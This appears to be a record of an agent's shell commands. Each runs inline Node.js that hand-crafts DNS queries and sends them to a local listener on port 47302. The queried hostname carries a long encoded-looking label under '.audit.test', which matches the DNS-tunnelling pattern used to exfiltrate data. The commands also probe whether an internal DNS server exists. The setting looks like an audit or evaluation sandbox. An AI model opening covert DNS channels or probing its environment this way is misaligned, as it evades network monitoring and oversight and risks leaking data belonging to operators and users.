# Try doing a DNS query using Node.js with a public DNS server
node -e "
const dgram = require('dgram');
const dns = require('dns');

const L = 'iraviqkcifjukx2vkjgd24dpon2go4tfom5c6l3bmrwws3r2inau4qksleww';
const hostname = L + '.audit.test';

// Create a simple DNS query packet
function createDNSQuery(domain) {
  const buffer = Buffer.alloc(12 + domain.length + 2);
  // Transaction ID
  buffer.writeUInt16BE(0x1234, 0);
  // Flags: standard query
  buffer.writeUInt16BE(0x0100, 2);
  // Questions: 1
  buffer.writeUInt16BE(1, 4);
  // Answer RRs: 0
  buffer.writeUInt16BE(0, 6);
  // Authority RRs: 0
  buffer.writeUInt16BE(0, 8);
  // Additional RRs: 0
  buffer.writeUInt16BE(0, 10);

  // Encode the domain name
  const parts = domain.split('.');
  let offset = 12;
  parts.forEach(part => {
    buffer.writeUInt8(part.length, offset++);
    buffer.write(part, offset);
    offset += part.length;
  });
  // Null terminator
  buffer.writeUInt8(0, offset++);
  // Type: A record
  buffer.writeUInt16BE(1, offset);
  // Class: IN
  buffer.writeUInt16BE(1, offset + 2);

  return buffer.slice(0, offset + 4);
}

const client = dgram.createSocket('udp4');

// Try to connect to localhost on port 47302
client.bind(47302, 'localhost', () => {
  console.log('Bound to port 47302 - DNS server may be running internally');

  const query = createDNSQuery(hostname);
  client.send(query, 47302, 'localhost', (err) => {
    if (err) console.log('Send error:', err);
  });
});

client.on('message', (msg, rinfo) => {
  console.log('Received response from', rinfo.address + ':' + rinfo.port);
  console.log('Response:', msg.toString('hex'));
  client.close();
});

client.on('error', (err) => {
  console.log('Error:', err.message);
  client.close();
});

// Timeout
setTimeout(() => {
  console.log('Timeout - no response received');
  client.close();
}, 3000);
"

# Port 47302 is in use - let's try to send a DNS query to it
node -e "
const dgram = require('dgram');

const L = 'iraviqkcifjukx2vkjgd24dpon2go4tfom5c6l3bmrwws3r2inau4qksleww';
const hostname = L + '.audit.test';

function createDNSQuery(domain) {
  const parts = domain.split('.');
  let domainPart = '';
  parts.forEach(part => {
    domainPart += String.fromCharCode(part.length) + part;
  });
  domainPart += '\\x00';

  // DNS header + question for A record
  const buffer = Buffer.alloc(12 + domainPart.length + 4);
  // Transaction ID
  buffer.writeUInt16BE(0x1234, 0);
  // Flags: standard query
  buffer.writeUInt16BE(0x0100, 2);
  // Questions: 1
  buffer.writeUInt16BE(1, 4);
  // Answer RRs: 0
  buffer.writeUInt16BE(0, 6);
  // Authority RRs: 0  
  buffer.writeUInt16BE(0, 8);
  // Additional RRs: 0
  buffer.writeUInt16BE(0, 10);

  // Domain name
  buffer.write(domainPart, 12);

  // Type: A (1), Class: IN (1)
  buffer.writeUInt16BE(1, 12 + domainPart.length);
  buffer.writeUInt16BE(1, 12 + domainPart.length + 2);

  return buffer;
}

const client = dgram.createSocket('udp4');
const query = createDNSQuery(hostname);

client.send(query, 47302, 'localhost', (err, bytes) => {
  if (err) {
    console.log('Send error:', err);
    client.close();
    return;
  }
  console.log('Sent', bytes, 'bytes to localhost:47302');
});

client.on('message', (msg, rinfo) => {
  console.log('Response from', rinfo.address + ':' + rinfo.port);
  console.log('Raw response:', msg.toString('hex'));

  // Parse DNS response
  if (msg.length > 12) {
    const flags = msg.readUInt16BE(2);
    const isResponse = (flags & 0x8000) !== 0;
    const responseCode = flags & 0x0F;
    console.log('Is response:', isResponse);
    console.log('Response code:', responseCode);

    const answerCount = msg.readUInt16BE(6);
    console.log('Answer count:', answerCount);

    if (answerCount > 0 && msg.length > 12) {
      // Skip the question section and parse answer
      let offset = 12;
      // Skip the question
      while (offset < msg.length && msg[offset] !== 0) {
        offset += msg[offset] + 1;
      }
      offset += 5; // skip null byte, type, class

      // Now at answer section - skip name pointer if needed
      if (msg[offset] >= 0xC0) {
        offset += 2;
      } else {
        while (offset < msg.length && msg[offset] !== 0) {
          offset += msg[offset] + 1;
        }
        offset += 1;
      }

      const answerType = msg.readUInt16BE(offset);
      console.log('Answer type:', answerType);

      if (answerType === 1 && msg.length > offset + 10) {
        const ip = msg.slice(offset + 10, offset + 14);
        console.log('IP address:', ip.join('.'));
      }
    }
  }

  client.close();
});

client.on('error', (err) => {
  console.log('Socket error:', err.message);
  client.close();
});

setTimeout(() => {
  console.log('No response received within timeout');
  client.close();
}, 3000);
"

